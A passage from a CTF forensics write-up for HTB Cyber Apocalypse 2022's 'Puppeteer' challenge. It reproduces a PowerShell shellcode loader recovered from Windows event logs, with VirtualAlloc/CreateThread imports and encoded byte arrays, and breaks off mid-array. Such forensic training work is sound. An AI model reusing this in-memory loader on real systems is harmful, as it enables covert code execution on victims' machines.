<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="HTB Cyber Apocalypse CTF 2022 - Forensics - Puppeteer writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Puppeteer" /><meta property="og:description" content="Puppeteer" /><link rel="canonical" href="/posts/htbca2022_puppeteer/" /><meta property="og:url" content="/posts/htbca2022_puppeteer/" /><meta property="og:site_name" content="ruifi47" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-21T23:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB Cyber Apocalypse CTF 2022 - Forensics - Puppeteer writeup" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-14T10:35:33+01:00","datePublished":"2022-05-21T23:00:00+01:00","description":"Puppeteer","headline":"HTB Cyber Apocalypse CTF 2022 - Forensics - Puppeteer writeup","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htbca2022_puppeteer/"},"url":"/posts/htbca2022_puppeteer/"}</script><title>HTB Cyber Apocalypse CTF 2022 - Forensics - Puppeteer writeup | ruifi47</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ruifi47"><meta name="application-name" content="ruifi47"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><body><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"> <img src="/assets/img/logo.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"> </a><div class="site-title"> <a href="/">ruifi47</a></div><div class="site-subtitle fst-italic">Tech blog</div></div><ul class="nav flex-column flex-grow-1 w-100 ps-0"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/ruifi47" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="javascript:location.href = 'mailto:' + ['ruifi47','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container px-xxl-5"><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100" > <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB Cyber Apocalypse CTF 2022 - Forensics - Puppeteer writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pe-xl-4"><div class="post px-1 px-md-2"><h1 data-toc-skip>HTB Cyber Apocalypse CTF 2022 - Forensics - Puppeteer writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1653170400" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > May 21, 2022 </em> </span> <span> Updated <em class="" data-ts="1689327333" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jul 14, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/ruifi47">ruifi47</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="505 words" > <em>2 min</em> read</span></div></div></div><div class="post-content"><h1 id="puppeteer"><strong>Puppeteer</strong></h1><h3 id="challenge-info"><span class="me-2"><strong>Challenge Info</strong></span><a href="#challenge-info" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p>Planet Longhir is known for it’s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation’s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite’s location was leaked since it is a top-sercret that only Galactic Federation’s council is aware of. Help her analyse the Council’s HQ event logs and solve this mystery.</p></blockquote><p>For this challenge we get a folder with Windows Event Log files (.evtx).</p><p>The first thing we should do is analyze all the Log files to see if we can catch any useful information. To do that we will use the <a href="https://docs.microsoft.com/en-us/shows/inside/event-viewer" title="Event Viewer">Windows Event Viewer app</a>.</p><p>In the description of one of the warnings in the <code class="language-plaintext highlighter-rouge">Microsoft-Windows-PowerShell%4Operational.evtx</code> file we have a powershell script that was created to run some code.</p><p><a href="/assets/img/posts/ctf-writeups/htbca2022/puppeteer/puppeteer1.png" class="popup img-link "><img data-src="/assets/img/posts/ctf-writeups/htbca2022/puppeteer/puppeteer1.png" alt="puppeteer1" class="lazyload" data-proofer-ignore></a> <em>Powershell script in Microsoft-Windows-PowerShell%4Operational.evtx file</em></p><p>The complete powershell script that we get from the Windows Event Log file above is the following:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="nv">$OleSPrlmhB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@</span><span class="w">

</span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$stage1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x99</span><span class="p">,</span><span class="w"> </span><span class="nx">0x85</span><span class="p">,</span><span class="w"> </span><span class="nx">0x93</span><span class="p">,</span><span class="w"> </span><span class="nx">0xaa</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb3</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa6</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb9</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa3</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb7</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb9</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb3</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$stage2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">xac</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe0</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa4</span><span class="p">,</span><span class="w"> </span><span class="nx">0xbb</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb7</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe4</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">;</span><span class="w">

</span><span class="nv">$tNZvQCljVk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-memberDefinition</span><span class="w"> </span><span class="nv">$OleSPrlmhB</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"Win32"</span><span class="w"> </span><span class="nt">-namespace</span><span class="w"> </span><span class="nx">Win32Functions</span><span class="w"> </span><span class="nt">-passthru</span><span class="p">;</span><span class="w">

</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$HVOASfFuNSxRXR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x2d</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x35</span><span class="p">,</span><span class="nx">0x21</span><span class="p">,</span><span class="nx">0x39</span><span class="p">,</span><span class="nx">0x1d</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x80</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x03</span><span class="p">,</span><span class="nx">0xb4</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xb1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x80</span><span class="p">,</span><span class="nx">0x87</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xde</span><span class="p">,</span><span class="nx">0x66</span><span class="p">,</span><span class="nx">0x9b</span><span class="p">,</span><span class="nx">0x9b</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xa3</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x7d</span><span class="p">,</span><span class="nx">0xed</span><span class="p">,</span><span class="nx">0xb0</span><span class="p">,</span><span class="nx">0xad</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0xfd</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0xdc</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x3c</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x80</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x93</span><span class="p">,</span><span class="nx">0xed</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0xb7</span><span class="p">,</span><span class="nx">0x50</span><span class="p">,</span><span class="nx">0xa9</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0xda</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0xde</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0xa3</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0xa5</span><span class="p">,</span><span class="nx">0xb6</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x95</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0x32</span><span class="p">,</span><span class="nx">0x87</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xe5</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x07</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0xdc</span><span class="p">,</span><span class="nx">0x7d</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0xe9</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0xd2</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0xf5</span><span class="p">,</span><span class="nx">0xd9</span><span class="p">,</span><span class="nx">0x94</span><span class="p">,</span><span class="nx">0xe8</span><span class="p">,</span><span class="nx">0x00</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0x09</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x95</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0xf5</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0xb7</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xdd</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x95</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0xcd</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x8f</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x3d</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xc3</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0x9a</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x8c</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x6f</span><span class="p">,</span><span class="nx">0xa6</span><span class="p">,</span><span class="nx">0xa2</span><span class="p">,</span><span class="nx">0xe3</span><span class="p">,</span><span class="nx">0x8e</span><span class="p">,</span><span class="nx">0xe2</span><span class="p">,</span><span class="nx">0xe3</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x87</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x37</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x50</span><span class="p">,</span><span class="nx">0x3d</span><span class="p">,</span><span class="nx">0x71</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x34</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x6d</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd4</span><span class="p">,</span><span class="nx">0xe8</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x79</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xc3</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x85</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x35</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0xa6</span><span class="p">,</span><span class="nx">0xf7</span><span class="p">,</span><span class="nx">0xd6</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x3b</span><span class="p">,</span><span class="nx">0xb9</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xf8</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0xba</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xdb</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x8f</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x13</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x3b</span><span class="p">,</span><span class="nx">0xde</span><span class="p">,</span><span class="nx">0x0e</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x16</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x28</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x74</span><span class="p">,</span><span class="nx">0xa5</span><span class="p">,</span><span class="nx">0xb0</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0xa5</span><span class="p">,</span><span class="nx">0xdb</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x1f</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0x34</span><span class="p">,</span><span class="nx">0x39</span><span class="p">,</span><span class="nx">0x42</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x3d</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x28</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0x08</span><span class="p">,</span><span class="nx">0x19</span><span class="p">,</span><span class="nx">0x8e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x29</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xaf</span><span class="p">,</span><span class="nx">0x84</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x15</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x8f</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x27</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0xb9</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x23</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x75</span><span class="p">,</span><span class="nx">0x82</span><span class="p">,</span><span class="nx">0x34</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x12</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x16</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span 